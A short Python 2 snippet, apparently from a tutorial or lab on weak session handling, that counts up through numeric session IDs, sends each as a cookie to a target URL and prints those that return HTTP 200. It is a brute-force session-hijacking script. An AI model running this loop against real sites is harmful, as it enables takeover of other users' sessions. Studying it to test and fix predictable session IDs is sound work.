session_id = 0

while True:
  headers  = { "Cookie" : "session_id=%s" % session_id }
  request  = urllib2.Request(url=url, headers=headers)
  response = urllib2.urlopen(request)

  if response.code == 200:
    print "Found valid session ID: %s" % session_id

  session_id += 1

  if session_id % 10000 == 0:
    print "Checked session IDs up to %s" % session_id
